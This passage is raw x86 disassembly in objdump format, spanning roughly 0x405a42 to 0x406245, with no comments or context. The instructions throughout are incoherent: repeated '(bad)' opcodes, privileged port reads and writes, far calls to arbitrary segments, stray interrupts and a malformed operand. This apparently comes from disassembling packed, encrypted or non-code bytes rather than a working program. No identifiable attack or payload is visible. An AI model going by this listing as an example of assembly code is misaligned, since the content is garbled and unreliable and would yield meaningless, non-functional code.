  405a42:	inc    edi
  405a43:	xor    bl,BYTE PTR [ebx+0x3d]
  405a46:	leave  
  405a47:	jne    0x405a94
  405a49:	pushf  
  405a4a:	retf   0xdb60
  405a4d:	jg     0x405aab
  405a4f:	addr16 mov esi,0x3a4e1e7
  405a55:	jp     0x405a36
  405a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a58:	ds add eax,0xc69b668c
  405a5e:	jns    0x4059f8
  405a60:	into   
  405a61:	cmc    
  405a62:	pop    es
  405a63:	sbb    BYTE PTR [edi-0x5230fed4],ah
  405a69:	mov    ecx,0xe5175b34
  405a6e:	ins    DWORD PTR es:[edi],dx
  405a6f:	or     edi,0xffffffd6
  405a72:	imul   ecx,DWORD PTR ds:0x901bf3d,0x3c4d850
  405a7c:	mov    al,0x5
  405a7e:	push   ecx
  405a7f:	sbb    dh,cl
  405a81:	test   ch,dh
  405a83:	ret    0x99ff
  405a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a87:	inc    edi
  405a88:	(bad)  
  405a89:	dec    edx
  405a8a:	adc    al,0x82
  405a8c:	mov    esi,0xff72d872
  405a91:	shr    DWORD PTR [ebx+0x56],cl
  405a94:	jno    0x405a3e
  405a96:	(bad)  
  405a98:	ficom  WORD PTR ds:0xd10997ac
  405a9e:	ss into 
  405aa0:	fstp   TBYTE PTR ds:0xa0ec1188
  405aa6:	repnz inc ebp
  405aa8:	add    al,BYTE PTR [eax]
  405aaa:	xor    DWORD PTR [esi-0x11],0xffffffd3
  405aae:	lock out dx,eax
  405ab0:	add    eax,ecx
  405ab2:	adc    eax,0xa1667ccd
  405ab7:	ja     0x405a42
  405ab9:	shl    DWORD PTR [esi-0x28],1
  405abc:	cs inc eax
  405abe:	cld    
  405abf:	xchg   edx,eax
  405ac0:	xchg   edi,eax
  405ac1:	repz mov esi,0x69b79ec4
  405ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac9:	adc    al,0xc4
  405acb:	xor    DWORD PTR [ebx-0x5f],eax
  405ace:	in     al,0xd
  405ad0:	inc    ecx
  405ad1:	jns    0x405b29
  405ad3:	sub    eax,0xa215f196
  405ad8:	add    cl,BYTE PTR [eax+0x548d2637]
  405ade:	xchg   esp,eax
  405adf:	mov    edx,0x9048d4d7
  405ae4:	push   cs
  405ae5:	add    al,0x54
  405ae7:	pop    ds
  405ae8:	lods   eax,DWORD PTR ds:[esi]
  405ae9:	sub    al,0x69
  405aeb:	add    eax,0x54298cc9
  405af0:	jmp    0x1ec:0x472eaf2a
  405af7:	leave  
  405af8:	out    0x17,eax
  405afa:	pop    esp
  405afb:	jge    0x405b32
  405afd:	xchg   ecx,eax
  405afe:	add    esp,DWORD PTR gs:[esi+0x5cc21efd]
  405b05:	xchg   esp,eax
  405b06:	mov    esi,0x78e4fcb8
  405b0b:	add    al,0x7a
  405b0d:	loop   0x405b10
  405b0f:	inc    esi
  405b10:	call   0x6101:0xeba8e60d
  405b17:	aas    
  405b18:	mov    esi,0xb3e5937d
  405b1d:	jae    0x405b7c
  405b1f:	mov    ds:0x347b1fc0,eax
  405b24:	mov    eax,ds:0x6810bd3f
  405b29:	cwde   
  405b2a:	ins    DWORD PTR es:[edi],dx
  405b2b:	add    ebp,DWORD PTR [ebx]
  405b2d:	call   0xef87:0xa71a2138
  405b34:	xor    edx,DWORD PTR [ebx+0x3b]
  405b37:	and    al,0x4b
  405b39:	aas    
  405b3a:	cmp    esi,eax
  405b3c:	inc    edx
  405b3d:	adc    esp,DWORD PTR [ebp+0x5810be39]
  405b43:	ret    
  405b44:	sbb    al,al
  405b46:	fist   WORD PTR [ecx]
  405b48:	mov    bl,0xd4
  405b4a:	or     al,0x90
  405b4c:	std    
  405b4d:	adc    BYTE PTR [ecx-0x45],0x3f
  405b51:	stc    
  405b52:	xchg   ebp,eax
  405b53:	xor    DWORD PTR [eax-0x3db21c5e],ebx
  405b59:	cmp    bl,bl
  405b5b:	ins    BYTE PTR es:[edi],dx
  405b5c:	cmp    al,0xd8
  405b5e:	les    ecx,FWORD PTR [ebx]
  405b60:	data16 mov al,0x5e
  405b63:	ret    0xc151
  405b66:	cmp    BYTE PTR [edi-0x6b7116dc],al
  405b6c:	out    0x26,eax
  405b6e:	pop    ebx
  405b6f:	(bad)  
  405b70:	mov    dh,0xf1
  405b72:	xor    eax,DWORD PTR [ebp-0x273038ec]
  405b78:	cs jle 0x405bdc
  405b7b:	cmp    al,0xdd
  405b7d:	aaa    
  405b7e:	out    0xf9,eax
  405b80:	cdq    
  405b81:	pop    ecx
  405b82:	inc    ecx
  405b83:	mov    ds:0xa56ae09f,al
  405b88:	inc    eax
  405b89:	jle    0x405be3
  405b8b:	pop    ebp
  405b8c:	mov    edx,0x18de5f05
  405b91:	sahf   
  405b92:	scas   eax,DWORD PTR es:[edi]
  405b93:	mov    ah,0x26
  405b95:	dec    ecx
  405b96:	leave  
  405b97:	shl    edi,1
  405b99:	jbe    0x405ba7
  405b9b:	imul   eax,ecx,0xffffffe5
  405b9e:	mov    edx,0xe8f30268
  405ba3:	call   0x59da:0x857f73a9
  405baa:	popf   
  405bab:	xchg   DWORD PTR [edx+0x73],ebx
  405bae:	jae    0x405ba4
  405bb0:	icebp  
  405bb1:	rcl    dh,1
  405bb3:	fnstcw WORD PTR [ebx]
  405bb5:	xchg   esi,eax
  405bb6:	push   0x74b2edb7
  405bbb:	fs xor ch,dl
  405bbe:	sub    BYTE PTR [ecx-0x7e59f6ac],bh
  405bc4:	cli    
  405bc5:	cs dec edx
  405bc7:	inc    eax
  405bc8:	ss or  eax,0x71f53cbb
  405bce:	mov    al,ds:0x8cac72d4
  405bd3:	test   DWORD PTR [eax],0xa77d1c6d
  405bd9:	mov    edx,0x86c7d84
  405bde:	push   edx
  405bdf:	test   BYTE PTR [ecx],0xe3
  405be2:	adc    DWORD PTR [edx-0x7f57884],0xffffff99
  405be9:	adc    bl,dh
  405beb:	in     eax,dx
  405bec:	mov    DWORD PTR [esi+0x16c240e0],edi
  405bf2:	xor    al,0x62
  405bf4:	int    0x1f
  405bf6:	les    eax,FWORD PTR [ebx]
  405bf8:	(bad)  
  405bf9:	cli    
  405bfa:	in     al,dx
  405bfb:	dec    ebx
  405bfc:	out    0x61,al
  405bfe:	inc    ecx
  405bff:	mov    bl,0xd6
  405c01:	enter  0x8f45,0xdd
  405c05:	jae    0x405bfd
  405c07:	mov    gs,WORD PTR [esi+0x7e17505c]
  405c0d:	int3   
  405c0e:	inc    edx
  405c0f:	and    dh,al
  405c11:	sti    
  405c12:	sub    esp,DWORD PTR [ecx-0x9]
  405c15:	adc    DWORD PTR [ebp-0x20],edx
  405c18:	sub    cl,BYTE PTR [edx]
  405c1a:	mov    cl,0xdd
  405c1c:	imul   esp,eax,0xc60e4af5
  405c22:	ja     0x405c5c
  405c24:	push   cs
  405c25:	pop    ss
  405c26:	jae    0x405bbe
  405c28:	dec    BYTE PTR [eax+0x54eb194e]
  405c2e:	adc    DWORD PTR [ebp-0x345a1c7],ebp
  405c34:	in     al,0x74
  405c36:	mov    esi,0xec0fc44
  405c3b:	and    eax,0xdbef8dd9
  405c40:	or     DWORD PTR [eax+0x77df3175],ecx
  405c46:	inc    esp
  405c47:	mov    edi,0x20fefc82
  405c4c:	out    dx,al
  405c4d:	inc    eax
  405c4e:	int3   
  405c4f:	je     0x405c70
  405c51:	push   ebp
  405c52:	sbb    esp,DWORD PTR gs:[eax]
  405c55:	pop    esp
  405c56:	mov    al,ds:0x46e3f0dc
  405c5b:	fbstp  TBYTE PTR [ebp-0x65]
  405c5e:	ror    BYTE PTR [esp+eax*1-0x21],0x42
  405c63:	sub    al,0xac
  405c65:	fbstp  TBYTE PTR [ecx-0x4c]
  405c68:	ret    0xea21
  405c6b:	sahf   
  405c6c:	inc    eax
  405c6d:	cmp    DWORD PTR [ecx],edx
  405c6f:	xor    DWORD PTR [ebx],ecx
  405c71:	hlt    
  405c72:	pop    eax
  405c73:	push   edi
  405c74:	jno    0x405c82
  405c76:	adc    BYTE PTR [edi+0x761c4be],al
  405c7c:	dec    esp
  405c7d:	cmp    DWORD PTR [ebp-0x73],eax
  405c80:	test   eax,0xc3ecb32c
  405c85:	jl     0x405cc6
  405c87:	jo     0x405d02
  405c89:	clc    
  405c8a:	jmp    DWORD PTR [eax+0x6a401ea1]
  405c90:	or     al,0x2f
  405c92:	jo     0x405c71
  405c94:	and    al,0x24
  405c96:	xchg   ebx,eax
  405c97:	out    0x40,al
  405c99:	in     eax,dx
  405c9a:	mov    edi,0x4dc4d204
  405c9f:	rcr    BYTE PTR [ecx+0x5f],cl
  405ca2:	loop   0x405c43
  405ca4:	es adc eax,0x3615fe95
  405caa:	fiadd  WORD PTR [ebx+0x77]
  405cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cae:	in     al,0xb7
  405cb0:	dec    eax
  405cb1:	sub    eax,0x5cf2fbce
  405cb6:	add    cl,dl
  405cb8:	pop    ecx
  405cb9:	cmp    dl,cl
  405cbb:	sbb    BYTE PTR [ecx+0x3b],dl
  405cbe:	xor    DWORD PTR [edx],edi
  405cc0:	in     al,0x49
  405cc2:	mov    dl,0x8a
  405cc4:	sar    ah,1
  405cc6:	and    bp,WORD PTR [ebp-0x5a38048e]
  405ccd:	xchg   esi,esi
  405ccf:	jns    0x405d07
  405cd1:	test   BYTE PTR [esi-0x68],ah
  405cd4:	add    edx,DWORD PTR [esi+0x25]
  405cd7:	(bad)  
  405cd8:	xchg   edi,eax
  405cd9:	cmp    ch,BYTE PTR [edi-0x22]
  405cdc:	inc    ebp
  405cdd:	repnz mov ah,BYTE PTR [eax]
  405ce0:	adc    ebx,0x44a7ea19
  405ce6:	mov    cl,0x40
  405ce8:	call   0x393689c9
  405ced:	popf   
  405cee:	fisttp DWORD PTR [eax]
  405cf0:	repnz mov ah,0xf2
  405cf3:	test   BYTE PTR [edi-0x67bb0a0c],0x3b
  405cfa:	fdiv   DWORD PTR [edx-0xb]
  405cfd:	xchg   DWORD PTR [ebx+ebx*1+0x329ebbf3],esp
  405d04:	mov    dh,BYTE PTR [ecx+edx*2+0x73]
  405d08:	fdivr  QWORD PTR [eax+0x2778b898]
  405d0e:	ja     0x405d69
  405d10:	(bad)  
  405d11:	adc    DWORD PTR [edi],eax
  405d13:	adc    BYTE PTR cs:0x37008e6f,ah
  405d1a:	sbb    BYTE PTR [ebx],cl
  405d1c:	test   eax,0xf100a04f
  405d21:	int3   
  405d22:	or     al,0xca
  405d24:	sti    
  405d25:	mov    al,0xc5
  405d27:	xchg   edx,eax
  405d28:	sub    eax,0x66402ac9
  405d2d:	jbe    0x405d6e
  405d2f:	sub    DWORD PTR [ebp+0xe38150a],edx
  405d35:	lods   al,BYTE PTR ds:[esi]
  405d36:	out    0xfa,al
  405d38:	jns    0x405d6f
  405d3a:	in     al,dx
  405d3b:	xchg   ecx,eax
  405d3c:	into   
  405d3d:	jno    0x405d33
  405d3f:	outs   dx,DWORD PTR ds:[esi]
  405d40:	in     eax,0x57
  405d42:	fstp   QWORD PTR [edx+ebp*1+0x56]
  405d46:	imul   ebp,DWORD PTR [edx],0x7d
  405d49:	in     eax,dx
  405d4a:	popa   
  405d4b:	xor    DWORD PTR [ebp-0x66],eax
  405d4e:	dec    esi
  405d4f:	pop    ebx
  405d50:	or     DWORD PTR [eax],eax
  405d52:	fdivr  DWORD PTR [ebx-0x79b329ed]
  405d58:	pop    esp
  405d59:	cdq    
  405d5a:	bound  eax,QWORD PTR [edx+ebx*2-0x68377524]
  405d61:	shl    DWORD PTR [ebx+0x4833840c],1
  405d67:	xor    ebp,esp
  405d69:	mov    edx,0xe4634f5e
  405d6e:	pop    edi
  405d6f:	add    DWORD PTR [ecx+0x4caacdc1],ecx
  405d75:	xchg   esp,eax
  405d76:	out    dx,eax
  405d77:	out    dx,eax
  405d78:	inc    esp
  405d79:	mov    ebx,0xe3074e09
  405d7e:	adc    BYTE PTR [ecx*1+0x3495df34],cl
  405d85:	packsswb mm2,QWORD PTR [edi-0x296fa065]
  405d8c:	mov    dl,0x46
  405d8e:	xchg   esi,esi
  405d90:	fcomp  st(3)
  405d92:	into   
  405d93:	leave  
  405d94:	pusha  
  405d95:	xor    eax,DWORD PTR [edi+0x336db0f8]
  405d9b:	lahf   
  405d9c:	inc    edx
  405d9d:	jns    0x405d5a
  405d9f:	enter  0xf372,0xcb
  405da3:	xor    dh,dl
  405da5:	gs or  eax,0xe2e4c848
  405dab:	call   0x92f3:0x6447b118
  405db2:	jb     0x405e01
  405db4:	punpckhwd mm0,QWORD PTR [eax+0x6aac271b]
  405dbb:	out    0xc7,eax
  405dbd:	push   esp
  405dbe:	ins    DWORD PTR es:[edi],dx
  405dbf:	daa    
  405dc0:	sbb    eax,0x558a48a8
  405dc5:	sub    eax,0xc4fba1f4
  405dca:	lods   al,BYTE PTR ds:[esi]
  405dcb:	dec    ebp
  405dcc:	mov    edx,0x8ead3a38
  405dd1:	mov    dh,cl
  405dd3:	inc    ebp
  405dd4:	std    
  405dd5:	cmp    DWORD PTR [eax+0x480cef8c],esp
  405ddb:	adc    eax,0x631b06b5
  405de0:	cmp    BYTE PTR [esi+0x1bad23cb],0xde
  405de7:	pop    ds
  405de8:	push   es
  405de9:	mov    edx,0x4999b05c
  405dee:	pushf  
  405def:	movups xmm0,xmm6
  405df2:	fwait
  405df3:	(bad)  
  405df6:	inc    eax
  405df7:	fst    DWORD PTR [ebp-0x1120024c]
  405dfd:	push   ss
  405dfe:	adc    eax,0xc0252788
  405e03:	jecxz  0x405de5
  405e05:	out    0x1a,al
  405e07:	sub    eax,0x395583df
  405e0d:	fild   DWORD PTR [ebp-0x2b8eed2e]
  405e13:	int3   
  405e14:	pop    ebx
  405e15:	dec    eax
  405e16:	(bad)  
  405e17:	jmp    0x405dbc
  405e19:	push   es
  405e1a:	xchg   ebx,eax
  405e1b:	sahf   
  405e1c:	inc    eax
  405e1d:	call   0xa7c2bcf3
  405e22:	xlat   BYTE PTR ds:[ebx]
  405e23:	or     esi,DWORD PTR [esi]
  405e25:	repnz into 
  405e27:	mov    al,ds:0x6113392d
  405e2c:	and    al,cl
  405e2e:	pop    es
  405e2f:	jae    0x405e16
  405e31:	mov    ebx,ebp
  405e33:	mov    eax,esp
  405e35:	dec    esi
  405e36:	sahf   
  405e37:	mov    dl,al
  405e39:	in     al,0xc7
  405e3b:	les    ebp,FWORD PTR [ebx+0xdda1f7b]
  405e41:	inc    eax
  405e42:	lods   al,BYTE PTR ds:[esi]
  405e43:	neg    ecx
  405e45:	add    dl,cl
  405e47:	pop    ss
  405e48:	mov    ss,WORD PTR [eax]
  405e4a:	mov    BYTE PTR [esi+0x6e],dh
  405e4d:	bound  esp,QWORD PTR [ebx]
  405e4f:	shl    BYTE PTR [eax],0x29
  405e52:	inc    eax
  405e53:	adc    ah,0x2a
  405e56:	addr16 js 0x405e48
  405e59:	clc    
  405e5a:	push   esi
  405e5b:	and    al,0xef
  405e5d:	mov    DWORD PTR [ebx+0x54],esp
  405e60:	jle    0x405e7f
  405e62:	lods   al,BYTE PTR ds:[esi]
  405e63:	push   edi
  405e64:	xchg   ebp,eax
  405e65:	nop
  405e66:	mov    eax,0x793e2f15
  405e6b:	cmp    ebx,DWORD PTR [esi-0x3724c19b]
  405e71:	imul   eax,esp,0xffffff85
  405e74:	mov    al,ds:0xa110886f
  405e79:	mov    edx,0xa2d3fa83
  405e7e:	stos   BYTE PTR es:[edi],al
  405e7f:	or     DWORD PTR [esi+0x4d],ebp
  405e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e83:	pop    eax
  405e84:	mov    eax,0x2683d538
  405e89:	mov    DWORD PTR [ecx+0xd4e32c9],edx
  405e8f:	ret    0xdc3
  405e92:	push   edx
  405e93:	inc    edi
  405e94:	sbb    al,0xf1
  405e96:	adc    ebx,edi
  405e98:	dec    esp
  405e99:	ror    BYTE PTR [ebx-0x372634eb],cl
  405e9f:	sbb    DWORD PTR [ebp+ecx*2-0x54],0x8653fcf5
  405ea7:	daa    
  405ea8:	xchg   DWORD PTR [edx],edi
  405eaa:	fld    DWORD PTR [edi-0x3df275b2]
  405eb0:	sbb    BYTE PTR [di+0x14],bl
  405eb4:	dec    edx
  405eb5:	ins    DWORD PTR es:[edi],dx
  405eb6:	retf   0x17e5
  405eb9:	push   edx
  405eba:	frstor [ebp+0x66]
  405ebd:	fiadd  DWORD PTR [eax-0x61]
  405ec0:	fistp  DWORD PTR [edi-0x2e]
  405ec3:	pop    ecx
  405ec4:	mov    esp,0x8ea773c3
  405ec9:	retf   0x2c95
  405ecc:	add    bl,bh
  405ece:	mov    eax,ds:0x1f100951
  405ed3:	fcom   QWORD PTR [eax+0x71]
  405ed6:	and    eax,0x1b4f9ec
  405edb:	jg     0x405f5a
  405edd:	add    al,0x33
  405edf:	and    al,0x22
  405ee1:	cmp    ebp,DWORD PTR [edi]
  405ee3:	cmp    BYTE PTR [edx+0x5f],cl
  405ee6:	jns    0x405f4b
  405ee8:	out    0xe6,al
  405eea:	push   ebp
  405eeb:	and    al,0xaf
  405eed:	inc    esp
  405eee:	ja     0x405f64
  405ef0:	xor    edx,ebx
  405ef2:	push   0xb
  405ef4:	sub    DWORD PTR [edi+0x7a6ae700],ebx
  405efa:	cmc    
  405efb:	xor    esp,DWORD PTR ss:[esi]
  405efe:	aas    
  405eff:	shl    BYTE PTR [edi+0x7a8e0b73],1
  405f05:	xchg   esp,eax
  405f06:	mov    cs,ebp
  405f08:	inc    edi
  405f09:	adc    eax,0xb7253402
  405f0e:	xor    eax,0xa9c8be09
  405f13:	inc    edx
  405f14:	retf   
  405f15:	out    0xbc,eax
  405f17:	loop   0x405f18
  405f19:	mov    ?,esi
  405f1b:	and    ebx,DWORD PTR [edx+0x3c]
  405f1e:	shr    ebx,0xe8
  405f21:	pop    ebp
  405f22:	mov    bl,BYTE PTR [esi]
  405f24:	adc    ch,ah
  405f26:	sahf   
  405f27:	xor    eax,0x9645d158
  405f2c:	dec    eax
  405f2d:	pushw  0xffc7
  405f30:	and    DWORD PTR [ebx-0x59],ebx
  405f33:	loop   0x405efe
  405f35:	dec    esp
  405f36:	push   0xffffff8d
  405f38:	mov    edi,DWORD PTR [edi-0x4c68e619]
  405f3e:	add    BYTE PTR ss:[ebx-0x63],al
  405f42:	push   esp
  405f43:	xchg   esp,eax
  405f44:	daa    
  405f45:	mov    ebx,0x75110b29
  405f4a:	mov    ecx,0x709726ba
  405f4f:	stc    
  405f50:	mov    bh,BYTE PTR [edx]
  405f52:	out    0x81,al
  405f54:	xchg   ecx,eax
  405f55:	sbb    BYTE PTR [edi+ebp*2],ah
  405f58:	xor    eax,0x6a
  405f5b:	jae    0x405fc2
  405f5d:	inc    eax
  405f5e:	xchg   edx,eax
  405f5f:	xchg   ecx,ebp
  405f61:	(bad)  
  405f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f63:	sti    
  405f64:	inc    edx
  405f65:	jp     0x405f66
  405f67:	push   eax
  405f68:	xor    dh,BYTE PTR [esi-0x4c6f95cf]
  405f6e:	in     al,dx
  405f6f:	outs   dx,DWORD PTR ds:[esi]
  405f70:	out    0x9f,eax
  405f72:	(bad)  
  405f73:	(bad)  
  405f74:	sbb    al,0x7e
  405f76:	mov    bh,0xff
  405f78:	bswap  ebx
  405f7a:	test   DWORD PTR [ecx-0x70],ecx
  405f7d:	jp     0x405fa8
  405f7f:	popf   
  405f80:	xchg   cl,dh
  405f82:	not    DWORD PTR [ebp-0x654b0063]
  405f88:	xchg   ebp,eax
  405f89:	sbb    eax,0x8b7b7547
  405f8e:	sbb    al,0x89
  405f90:	fsubr  DWORD PTR ds:0x59ab1e2c
  405f96:	mov    al,ds:0x108351c7
  405f9b:	mov    bh,0xf3
  405f9d:	add    eax,0xb4475c3
  405fa2:	ret    
  405fa3:	and    DWORD PTR [ecx],edi
  405fa5:	add    edi,DWORD PTR [ebx]
  405fa7:	xchg   esi,eax
  405fa8:	pop    esi
  405fa9:	jne    0x405f4b
  405fab:	dec    esi
  405fac:	ret    
  405fad:	xchg   edx,eax
  405fae:	ret    
  405faf:	fimul  DWORD PTR [ebx-0x5a]
  405fb2:	stos   DWORD PTR es:[edi],eax
  405fb3:	mov    cl,0x86
  405fb5:	mov    ecx,DWORD PTR [eax+0x69]
  405fb8:	or     eax,0xc7ff7cad
  405fbd:	jg     0x405fcf
  405fbf:	pusha  
  405fc0:	sar    BYTE PTR [ebx],0x13
  405fc3:	pop    esi
  405fc4:	fmul   QWORD PTR [eax+0x27]
  405fc7:	jae    0x405f7c
  405fc9:	inc    eax
  405fca:	xchg   esi,eax
  405fcb:	int    0x5f
  405fcd:	jge    0x405fa8
  405fcf:	popa   
  405fd0:	sahf   
  405fd1:	rcl    DWORD PTR [esi],cl
  405fd3:	mov    dh,0x96
  405fd5:	outs   dx,BYTE PTR ds:[esi]
  405fd6:	call   0x2d79ba21
  405fdb:	dec    esi
  405fdc:	xor    esi,edi
  405fde:	test   eax,0x41ebb2c5
  405fe3:	sar    ebx,cl
  405fe5:	mov    dl,0x42
  405fe7:	adc    eax,0x7801b75b
  405fec:	mov    WORD PTR [eax],cs
  405fee:	pop    ebp
  405fef:	aam    0x14
  405ff1:	xor    ebp,DWORD PTR [esi-0x5647f7bb]
  405ff7:	xchg   ebx,eax
  405ff8:	jmp    0x3d0a85b6
  405ffd:	das    
  405ffe:	sbb    al,0x49
  406000:	int    0x18
  406002:	(bad)  
  406003:	xchg   edi,eax
  406004:	sahf   
  406005:	outs   dx,BYTE PTR gs:[esi]
  406007:	mov    edi,0x6fde983d
  40600c:	in     eax,0xcc
  40600e:	gs stos DWORD PTR es:[edi],eax
  406010:	icebp  
  406011:	mov    bl,0x4
  406013:	jne    0x405fdc
  406015:	pusha  
  406016:	fcomp  st(1)
  406018:	gs mov ah,0x5c
  40601b:	fld    QWORD PTR [esi]
  40601d:	mov    edi,0xf5782aef
  406022:	push   es
  406023:	mov    DWORD PTR [ebx-0x17],ecx
  406026:	mov    edi,0xbc54a8f
  40602b:	dec    eax
  40602c:	xchg   edi,eax
  40602d:	sar    DWORD PTR [eax],1
  40602f:	add    BYTE PTR [esi+edi*1+0x8dba433],ch
  406036:	shr    eax,0xaf
  406039:	int    0xfe
  40603b:	push   esp
  40603c:	push   cs
  40603d:	enter  0x59e9,0xbf
  406041:	xchg   ecx,eax
  406042:	mov    bh,0x2
  406044:	repnz lock test BYTE PTR [eax+0x41],al
  406049:	jge    0x40600b
  40604b:	mov    edi,0xff186812
  406050:	and    ecx,edx
  406052:	daa    
  406053:	ret    0x6ba
  406056:	or     al,0xd6
  406058:	push   0xffffffd2
  40605a:	stc    
  40605b:	sbb    al,0x3c
  40605d:	push   ecx
  40605e:	enter  0xd3ab,0xf6
  406062:	cdq    
  406063:	sbb    dh,BYTE PTR [ebx+0x3c38c854]
  406069:	pop    esp
  40606a:	inc    ecx
  40606b:	(bad)
  40606e:	call   0xa7bb:0x5956f5bb
  406075:	fsubr  DWORD PTR [eax-0x6d]
  406078:	fst    DWORD PTR [ebx]
  40607a:	icebp  
  40607b:	pop    ss
  40607c:	outs   dx,BYTE PTR ds:[esi]
  40607d:	mov    cl,0x1f
  40607f:	shr    BYTE PTR ds:0xcbf978f,cl
  406085:	int    0x50
  406087:	jbe    0x4060d2
  406089:	fsub   QWORD PTR [ebx+0x2c]
  40608c:	cdq    
  40608d:	retf   0xd536
  406090:	lods   eax,DWORD PTR ds:[esi]
  406091:	jno    0x4060eb
  406093:	cmc    
  406094:	pop    ecx
  406095:	mov    BYTE PTR [ecx],0x3d
  406098:	ftst   
  40609a:	and    DWORD PTR [ecx],esp
  40609c:	xor    ebx,DWORD PTR [ebx+0x74]
  40609f:	out    0x38,eax
  4060a1:	or     dh,BYTE PTR [eax-0x74]
  4060a4:	retf   0x240e
  4060a7:	sub    dh,ch
  4060a9:	leave  
  4060aa:	fwait
  4060ab:	push   cs
  4060ac:	push   esi
  4060ad:	sbb    eax,0x3043230f
  4060b2:	ja     0x4060bf
  4060b4:	mov    ch,0x29
  4060b6:	push   edx
  4060b7:	cdq    
  4060b8:	mov    eax,0x67d36197
  4060bd:	mov    al,fs:0x376279f5
  4060c3:	mov    ebx,0x60c9d035
  4060c8:	xchg   ecx,eax
  4060c9:	sbb    BYTE PTR [edx-0x6],bh
  4060cc:	jge    0x406056
  4060ce:	shl    BYTE PTR [edx-0x31],1
  4060d1:	test   eax,0x4b720864
  4060d6:	mov    edi,0x206c345f
  4060db:	test   DWORD PTR [eax-0x20d6a34],edx
  4060e1:	cdq    
  4060e2:	dec    eax
  4060e3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4060e5:	outs   dx,BYTE PTR ds:[esi]
  4060e6:	pusha  
  4060e7:	cwde   
  4060e8:	loop   0x406155
  4060ea:	(bad)  
  4060eb:	jle    0x4060fb
  4060ed:	mov    cl,0x5f
  4060ef:	cmp    BYTE PTR [ecx-0x20],bh
  4060f2:	aad    0xd4
  4060f4:	mov    edi,0x8d6b064f
  4060f9:	lock mov DWORD PTR [ebx-0x5642e4b5],eax
  406100:	std    
  406101:	sbb    ch,BYTE PTR [ecx]
  406103:	jp     0x4060af
  406105:	sbb    DWORD PTR ds:0x9e570bcc,esi
  40610b:	jno    0x4060e6
  40610d:	lods   al,BYTE PTR ds:[esi]
  40610e:	aas    
  40610f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406110:	icebp  
  406111:	imul   esp,DWORD PTR [esi-0x8],0xffffff9b
  406115:	jecxz  0x406182
  406117:	sbb    eax,0xea95592d
  40611c:	fstp   QWORD PTR [edx]
  40611e:	out    0x27,al
  406120:	xchg   edi,eax
  406121:	push   ecx
  406122:	mov    al,0xe8
  406124:	ficomp WORD PTR ds:0xf078ad6f
  40612a:	sub    eax,0xedf84521
  40612f:	or     edx,ebp
  406131:	xor    BYTE PTR [edi+0x27d9f109],0x2c
  406138:	das    
  406139:	cmp    eax,0x4303fe16
  40613e:	jp     0xf68da45d
  406144:	mov    ds:0xef36f7eb,eax
  406149:	bound  esp,QWORD PTR [ebx+0x3f3d21c9]
  40614f:	or     DWORD PTR [ebx-0x1e212de4],ebx
  406155:	xchg   edx,eax
  406156:	lods   eax,DWORD PTR ds:[esi]
  406157:	mov    ebp,0xcc39a8cd
  40615c:	ret    
  40615d:	dec    edx
  40615e:	mov    cl,0x56
  406160:	test   BYTE PTR [edx-0x77],dh
  406163:	sub    DWORD PTR [edx-0x7a8c9ec1],ebx
  406169:	mov    edi,0xea3d3b65
  40616e:	sbb    al,0xa8
  406170:	hlt    
  406171:	pop    edx
  406172:	mov    WORD PTR [eax],fs
  406174:	out    0x46,eax
  406176:	push   ss
  406177:	jno    0x406160
  406179:	fdivr  QWORD PTR [edx-0x38]
  40617c:	push   es
  40617d:	pop    ecx
  40617e:	or     cl,cl
  406180:	mov    al,0x9e
  406182:	cmp    al,BYTE PTR [esi]
  406184:	sub    DWORD PTR [eax-0x70a6221f],edx
  40618a:	cdq    
  40618b:	pop    edx
  40618c:	mov    ecx,0xad4a72e8
  406191:	mov    edi,0x8234f1e8
  406196:	inc    ecx
  406197:	(bad)  
  406198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406199:	pop    eax
  40619a:	arpl   bx,si
  40619c:	adc    al,0x71
  40619e:	js     0x406155
  4061a0:	addr16 jp 0x406157
  4061a3:	sub    bh,bh
  4061a5:	je     0x4061cc
  4061a7:	mov    dh,0x9d
  4061a9:	stos   DWORD PTR es:[edi],eax
  4061aa:	xchg   edi,eax
  4061ab:	jne    0x40621c
  4061ad:	sahf   
  4061ae:	xor    BYTE PTR [ecx],0xa8
  4061b1:	inc    esp
  4061b2:	push   ss
  4061b3:	sti    
  4061b4:	mov    DWORD PTR [esi-0x4b5f9566],esi
  4061ba:	ja     0x406189
  4061bc:	sbb    esi,edx
  4061be:	or     al,dh
  4061c0:	popa   
  4061c1:	sub    eax,0xb9ac139c
  4061c6:	sub    al,0x5d
  4061c8:	mov    eax,0x38985d24
  4061cd:	mov    ebx,0xb6694c61
  4061d2:	mov    eax,0x467c3737
  4061d7:	dec    edx
  4061d8:	jbe    0x4061a2
  4061da:	inc    esi
  4061db:	cmp    al,0xbd
  4061dd:	nop
  4061de:	adc    eax,0xc028ae3c
  4061e3:	test   eax,0x543f1fe0
  4061e8:	aaa    
  4061e9:	out    dx,eax
  4061ea:	jae    0x406225
  4061ec:	or     BYTE PTR [edx],bh
  4061ee:	mov    edi,0x2fc550fb
  4061f3:	mov    eax,ds:0xad172aa7
  4061f8:	jp     0x4061e3
  4061fa:	pushf  
  4061fb:	mov    ds:0x7278126d,al
  406200:	imul   esp,DWORD PTR [esi-0x439af968],0xf02b4625
  40620a:	pop    esp
  40620b:	dec    esi
  40620c:	sbb    al,dl
  40620e:	icebp  
  40620f:	xor    ebx,DWORD PTR [edx+0x6953facc]
  406215:	xlat   BYTE PTR ds:[ebx]
  406216:	iret   
  406217:	scas   al,BYTE PTR es:[edi]
  406218:	ror    BYTE PTR [edx+0xc84b2ff],cl
  40621e:	adc    eax,0xd619a646
  406223:	or     DWORD PTR ds:[eax+0x17],edx
  406227:	inc    edi
  406228:	xchg   edx,eax
  406229:	out    dx,al
  40622a:	shl    edx,cl
  40622c:	or     ah,dl
  40622e:	jno    0x4061f3
  406230:	jo     0x4061e6
  406232:	fsub   DWORD PTR [edx+0x121acde0]
  406238:	rcr    BYTE PTR [ebx+0x16e2fc43],cl
  40623e:	pop    edi
  40623f:	xor    DWORD PTR [ebp+0x5a],edi
  406242:	push   esi
  406243:	adc    dl,dl
  406245:	lahf   
